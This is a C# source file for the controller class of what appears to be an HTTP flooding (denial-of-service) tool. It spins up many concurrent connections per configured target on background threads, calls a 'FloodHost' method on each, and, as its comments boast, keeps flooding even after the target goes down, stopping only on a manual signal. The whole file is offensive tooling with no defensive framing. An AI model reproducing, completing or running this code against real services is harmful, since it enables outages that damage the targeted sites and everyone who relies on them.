// process that starts all of the connections
// on a different thread and keeps that thread 
// untill all of them are closed manually this
// process does not stop even when target is down
internal class FlooderProcess
{
    private readonly Configuration _configuration;
    private readonly List<LimitedHttpConnection> _connections;
    private readonly AutoResetEvent _resetEvent;

    public bool IsFlooding => !_resetEvent.WaitOne(0);

    public FlooderProcess(Configuration configuration)
    {
        _configuration = configuration;
        _connections = new List<LimitedHttpConnection>();
        _resetEvent = new(false);
    }

    public void BeginFlood()
    {
        foreach (var t in _configuration.targets)
        {
            // queue single target into it's own thread work
            ThreadPool.QueueUserWorkItem<TargetInfo>(
                async (target) =>
                {
                    // list of concurrenct connections
                    List<Task> tasks = new();
                    // create concurrent connections
                    for (int i = 0; i < target.concurrency; i++)
                    {
                        // instantiate connection with reset event to gracefully stop 
                        // connection when needed
                        var connection = new LimitedHttpConnection(target, _resetEvent);
                        // we need to keep track of the connectio objects
                        // so we can send manual stop request to them
                        _connections.Add(connection);
                        // as well as all the asynchronous flood tasks
                        // so we can gracefully end up the flood
                        tasks.Add(connection.FloodHost());
                    }
                    // since it's working on background thread
                    // we can just await completion of all
                    // concurrent connections to funish their job
                    await Task.WhenAll(tasks.ToArray());
                },
                t,
                false);
        }
    }

    // informs all of the connections to stop
    // flooding and waits for them to finish 
    public void Stop()
    {
        // set event to stop flooding
        _resetEvent.Set();
        // while we have connections
        while (_connections.Any())
        {
            // check if connection is alive ( has socket )
            if (_connections[0].IsAlive)
            {
                // manually send stop event
                _connections[0].Stop();
                // continue to check if it stopped
                continue;
            }

            // if connection was terminated
            // remove this connection from the pool
            _connections.RemoveAt(0);
        }
    }
}